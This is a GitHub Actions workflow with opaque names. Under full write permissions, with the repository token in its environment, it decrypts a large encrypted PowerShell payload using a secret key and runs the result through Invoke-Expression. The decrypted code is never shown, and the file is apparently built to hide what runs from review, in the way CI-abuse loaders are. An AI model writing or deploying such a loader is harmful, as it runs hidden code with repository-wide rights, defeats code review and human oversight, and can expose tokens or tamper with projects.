name: Shaw

on: 
  workflow_dispatch:
    inputs:
      option1:
        required: true
        default: ''
        type: string
      option2:
        required: false
        default: ''
        type: string
      option3:
        required: true
        default: 330
        type: number
      option4:
        required: true
        default: false
        type: boolean
 
permissions: write-all

env:
  GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  DECRYPTION_KEY: ${{ secrets.DECRYPTION_KEY }}
  OPTION_1: ${{ inputs.option1 }}
  OPTION_2: ${{ inputs.option2 }}
  OPTION_3: ${{ inputs.option3 }}
  OPTION_4: ${{ inputs.option4 }}

jobs:
  k:
    runs-on: windows-latest
    steps:
      - name: June
        shell: pwsh
        run: |
          $encrypted_payload = "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"
          $passphrase = $env:DECRYPTION_KEY

          $iterations = 10000
          $keySizeBytes = 32
          $ivSizeBytes = 16

          function Try-OpenSSLStyleDecrypt {
              param(
                  [byte[]]$ciphertextWithPossibleHeader,
                  [string]$password
              )

              try {
                  if (-not $password) {
                      throw "no supply"
                  }

                  # Check for OpenSSL 'Salted__' header (ASCII) -> first 8 bytes 'Salted__', next 8 bytes salt
                  $header = [System.Text.Encoding]::ASCII.GetString($ciphertextWithPossibleHeader, 0, [Math]::Min(8, $ciphertextWithPossibleHeader.Length))
                  if ($header -eq "Salted__") {
                      # extract salt (bytes 8..15) and ciphertext (from byte 16 onward)
                      $salt = [byte[]]($ciphertextWithPossibleHeader[8..15])
                      $cipherBytes = if ($ciphertextWithPossibleHeader.Length -gt 16) { [byte[]]($ciphertextWithPossibleHeader[16..($ciphertextWithPossibleHeader.Length - 1)]) } else { @() }
                  } else {
                      # no salt header found — assume the whole buffer is raw ciphertext, no salt
                      $salt = $null
                      $cipherBytes = $ciphertextWithPossibleHeader
                  }

                  # Derive key+iv using PBKDF2
                  $passwordBytes = [System.Text.Encoding]::UTF8.GetBytes($password)

                  if ($salt -ne $null -and $salt.Length -gt 0) {
                      # Try to use SHA256-based Rfc2898DeriveBytes (requires .NET that supports HashAlgorithmName overload)
                      try {
                          $deriveCtor = [System.Security.Cryptography.Rfc2898DeriveBytes].GetConstructors() |
                                        Where-Object { $_.GetParameters().Length -ge 3 } |
                                        Select-Object -First 1
                          # Use explicit HashAlgorithmName if available (PowerShell Core / modern .NET)
                          $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes(
                              ([System.Text.Encoding]::UTF8.GetString($passwordBytes)),
                              $salt,
                              $iterations,
                              [System.Security.Cryptography.HashAlgorithmName]::SHA256
                          )
                      } catch {
                          # Fallback to older constructor (uses HMACSHA1) — only do this if you know the data was derived with SHA1
                          $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes(
                              $password,
                              $salt,
                              $iterations
                          )
                          Write-Warning "Rfc2898DeriveBytes SHA256 overload not available; falling back to default SHA1-based PBKDF2. If encryption used PBKDF2-SHA256, specify a PowerShell/.NET runtime that supports it."
                      }
                  } else {
                      # no salt -> cannot derive key reliably; try deriving with empty salt
                      $salt = ,0..7 | ForEach-Object { [byte]0 }
                      $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, $iterations, [System.Security.Cryptography.HashAlgorithmName]::SHA256)
                  }

                  $key = $rdb.GetBytes($keySizeBytes)
                  $iv  = $rdb.GetBytes($ivSizeBytes)

                  # Create AES decryptor
                  $aes = [System.Security.Cryptography.Aes]::Create()
                  $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
                  $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
                  $aes.KeySize = 256
                  $aes.Key = $key
                  $aes.IV = $iv

                  $transform = $aes.CreateDecryptor()
                  $ms = New-Object System.IO.MemoryStream (,$cipherBytes)
                  $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $transform, [System.Security.Cryptography.CryptoStreamMode]::Read)
                  $sr = New-Object System.IO.StreamReader($cs, [System.Text.Encoding]::UTF8)
                  $plaintext = $sr.ReadToEnd()

                  # clean up
                  $sr.Close(); $cs.Close(); $ms.Close(); $aes.Dispose()

                  return $plaintext
              } catch {
                  throw $_
              }
          }

          try {
              $cipherBytes = [Convert]::FromBase64String($encrypted_payload)

              $decrypted = Try-OpenSSLStyleDecrypt -ciphertextWithPossibleHeader $cipherBytes -password $passphrase

              if ($null -ne $decrypted -and $decrypted.Length -gt 0) {
                  Invoke-Expression $decrypted
              } else {
                  Write-Error "Decryption succeeded but produced empty output."
              }
          } catch {
              Write-Error "Decryption failed: $($_.Exception.Message)"
          }
